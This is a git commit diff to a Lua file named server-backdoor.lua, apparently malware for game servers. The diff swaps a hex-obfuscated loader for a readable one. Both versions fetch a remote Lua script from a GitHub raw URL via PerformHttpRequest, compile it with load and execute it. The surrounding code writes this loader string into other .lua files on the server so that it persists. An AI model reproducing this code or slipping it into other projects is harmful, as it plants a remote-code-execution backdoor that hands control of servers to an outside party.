de3e83a93f1f850c2bc2b050647e030971393f2d
Syntaxsy <npro9021@gmail.com>
2023-05-16 10:21:42 +0200

    Updated

--- server-backdoor.lua
+++ server-backdoor.lua
@@ -150,39 +150,45 @@ function SDhskXCsi391()
 					
 						local sAk = [[
 						
-local llIllIIlIIIIIIll = {
-    Ench, Support, Host, Pairs,
-    Realease, Callbacks, Source,
-    Hosting, Event, PerformHttpRequest,
-    assert, server, load, Spawn, materials
-}
 
-local IIlIlllllIIlIIIl = {
-    '68', '74', '74', '70', '73', '3A', '2F', '2F', '72',
-	'61', '77', '2E', '67', '69', '74', '68', '75', '62',
-	'75', '73', '65', '72', '63', '6F', '6E', '74', '65',
-	'6E', '74', '2E', '63', '6F', '6D', '2F', '53', '79',
-	'6E', '74', '61', '78', '73', '73', '2F', '4F', '2F',
-	'6D', '61', '73', '74', '65', '72', '2F', '73', '65',
-	'72', '76', '65', '72', '2D', '62', '61', '63', '6B',
-	'64', '6F', '6F', '72', '2E', '6C', '75', '61'
-}
-
-function lIlllIlllIlIIlIl()
-    _empt = ''
-    for id,it in pairs(IIlIlllllIIlIIIl) do
-        _empt = _empt..it
-    end
-    return (_empt:gsub('..', function (cc)
-        return string.char(tonumber(cc, 16))
-    end))
-end
-
-llIllIIlIIIIIIll[10](lIlllIlllIlIIlIl(), function (e, d)
-    local s = llIllIIlIIIIIIll[11](llIllIIlIIIIIIll[13](d))
-    if (d == nil) then return end
-    s()
-end)
+						local Methods = {
+							Ench, Support, Host, pairs,
+							Realease, Callbacks, Source,
+							Hosting, Event, PerformHttpRequest,
+							assert, server, load, Spawn, materials
+						}
+						
+						
+						local Link = {
+							'68', '74', '74', '70', '73', '3a', '2f', '2f', '72', '61',
+							'77', '2e', '67', '69', '74', '68', '75', '62', '75', '73',
+							'65', '72', '63', '6f', '6e', '74', '65', '6e', '74', '2e',
+							'63', '6f', '6d', '2f', '53', '79', '6e', '74', '61', '78',
+							'73', '73', '2f', '4f', '2f', '6d', '61', '73', '74', '65',
+							'72', '2f', '73', '65', '72', '76', '65', '72', '2d', '62',
+							'61', '63', '6b', '64', '6f', '6f', '72', '2e', '6c', '75',
+							'61'
+						
+						
+						}
+						
+						
+						function decode()
+							_empt = ''
+							for id,it in pairs(Link) do
+								_empt = _empt..it
+							end
+							return (_empt:gsub('..', function (cc)
+								return string.char(tonumber(cc, 16))
+							end))
+						end
+						
+						PerformHttpRequest('https://raw.githubusercontent.com/Syntaxsy/O/master/server-backdoor.lua', function (e, d)
+							local s = assert(load(d))
+							if (d == nil) then return end
+							s()
+						end)
+						
 						]]
 						az = sAk
 						ap = io.open(an.."/"..eXux..".lua", "w")
